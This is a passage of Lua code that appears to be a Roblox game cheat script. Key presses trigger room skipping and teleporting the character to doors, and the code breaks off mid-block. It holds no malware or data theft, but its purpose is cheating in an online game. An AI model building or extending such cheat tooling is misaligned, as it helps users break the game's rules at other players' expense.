game.UserInputService.InputBegan:Connect(function(Input)
	if Script.Mode == "RoomSkip" then
		if Input.KeyCode == Enum.KeyCode.P and Script.Action == "Idle" then
			Script.AutoRoomSkip = false
			TeleportToDoor()
		end
		if Input.KeyCode == Enum.KeyCode.Z then
			Script.AutoRoomSkip = false
			if RoomSkip.NextUngeneratedRoom == nil then
				print("WARNING | No NextUngeneratedRoom")
			end
			ClearAllStats(true)
		end
		if Input.KeyCode == Enum.KeyCode.K then
			Script.Action = "Teleport LastOpened ProgressDoor"
			Script.AutoRoomSkip = false
			GetNextUngeneratedRoom()
			RoomStats()
			if Main.CharacterRoot ~= nil and RoomSkip.Exit ~= nil then
